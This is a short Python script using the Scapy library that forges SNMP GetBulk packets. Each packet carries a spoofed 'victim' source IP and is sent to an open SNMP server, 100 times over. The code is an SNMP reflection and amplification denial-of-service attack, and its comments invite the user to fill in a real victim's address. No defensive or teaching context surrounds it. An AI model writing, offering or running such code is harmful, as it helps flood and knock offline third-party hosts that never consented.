from scapy.all import *

victim_ip = "192.168.1.100"   # Replace with actual victim's IP
snmp_server = "192.168.1.200" # Replace with an open SNMP server

packet = IP(src=victim_ip, dst=snmp_server) / \
         UDP(sport=40000, dport=161) / \
         SNMP(version=2, community="public", PDU=SNMPbulk(id=RandInt(), max_repetitions=10))

send(packet, count=100, iface="eth0")  # Send multiple packets